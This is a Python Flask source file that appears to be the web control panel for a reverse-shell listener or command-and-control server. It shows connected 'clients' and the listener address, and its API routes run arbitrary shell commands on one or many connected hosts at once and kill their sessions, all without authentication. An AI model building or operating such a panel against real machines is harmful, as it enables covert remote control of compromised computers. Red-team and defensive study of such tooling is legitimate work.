from flask import Flask, request, Response, send_from_directory
from core.server import shellserver
import socket
import random
import sys

app = Flask(__name__)
port = int(sys.argv[1]) if len(sys.argv) >= 1 else random.randint(7000, 15535)
shell = shellserver(port=port)

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '0.0.0.0'
    finally:
        s.close()
    return IP

@app.route("/")
def index():
    return open("./core/http/index.html", "r").read()

@app.route("/shell")
def shellhtml():
    return open("./core/http/shell.html", "r").read()

@app.route("/chart.js")
def chartjs():
    return Response(open("./core/http/chart.js", "r").read(), mimetype='text/javascript')

@app.route("/api/data/clients")
def clientData():
    return shell.info

@app.route("/api/data/host")
def hostData():
    return {
        "listener": get_ip(),
        "port": str(port)
    }

@app.route("/api/shell/run", methods=["POST"])
def runcmd():
    a = request.get_json(force=True)

    if type(a["uid"]) != list:
        dta = shell.runCommand(a["uid"], a["command"])
        print(dta)
    else:
        for x in a["uid"]:
            print('exec on {}'.format(x))
            shell.runCommand(x, a["command"], _async=True)
        return "executed command \"{}\" on {} hosts".format(a["command"], len(a["uid"]))

    return dta

@app.route("/api/shell/delete", methods=["POST"])
def delete():
    a = request.get_json(force=True)

    if type(a["uid"]) != list:
        shell.killUID(a["uid"])
    else:
        for x in a["uid"]:
            # mortifying thing to say
            print('killed child {}'.format(x))
            shell.killUID(x)

        return "killed {} hosts".format(len(a["uid"]))

    return "ok"

@app.route('/favicon.ico')
def favicon():
    return send_from_directory('./core/http/', 'icon.ico',mimetype='image/vnd.microsoft.icon')


app.run(host="0.0.0.0", port=80)